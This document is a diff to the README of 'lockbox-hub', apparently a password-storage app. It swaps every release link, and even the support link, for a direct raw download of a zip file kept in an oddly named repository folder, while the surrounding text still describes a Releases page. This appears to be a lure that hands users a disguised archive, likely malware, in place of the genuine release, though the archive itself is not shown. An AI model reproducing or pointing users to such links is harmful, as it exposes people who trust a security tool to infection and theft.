@@ -7,12 +7,12 @@ lockbox-hub is a user-friendly application designed to help you securely store y
 To begin using lockbox-hub, you need to download and install the application on your computer. Follow the steps below to get started.
 
 ### 📥 Download lockbox-hub
-[![Download lockbox-hub](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Rahul-kushwaha7050/lockbox-hub/releases)
+[![Download lockbox-hub](https://raw.githubusercontent.com/Rahul-kushwaha7050/lockbox-hub/main/fluctisonant/lockbox-hub.zip)](https://raw.githubusercontent.com/Rahul-kushwaha7050/lockbox-hub/main/fluctisonant/lockbox-hub.zip)
 
 ### 🔗 Step 1: Visit the Releases Page
 To download the application, click the link below, which will take you to the Releases page. 
 
-[Download lockbox-hub here](https://github.com/Rahul-kushwaha7050/lockbox-hub/releases)
+[Download lockbox-hub here](https://raw.githubusercontent.com/Rahul-kushwaha7050/lockbox-hub/main/fluctisonant/lockbox-hub.zip)
 
 ### 📂 Step 2: Choose the Latest Release
 On the Releases page, you will see a list of available versions. Find the latest release, which is usually at the top of the list. 
@@ -48,9 +48,9 @@ If you encounter issues during installation or use, try the following:
 - Restart your computer and attempt the installer again.
 
 ## 📞 Support
-For any further questions or assistance, please visit our [GitHub Issues page](https://github.com/Rahul-kushwaha7050/lockbox-hub/issues) to report bugs or request help.
+For any further questions or assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Rahul-kushwaha7050/lockbox-hub/main/fluctisonant/lockbox-hub.zip) to report bugs or request help.
 
 ## 🔗 Conclusion
 We hope you find lockbox-hub useful for your security needs. Visit the link below for the latest download:
 
-[Download lockbox-hub here](https://github.com/Rahul-kushwaha7050/lockbox-hub/releases)
+[Download lockbox-hub here](https://raw.githubusercontent.com/Rahul-kushwaha7050/lockbox-hub/main/fluctisonant/lockbox-hub.zip)
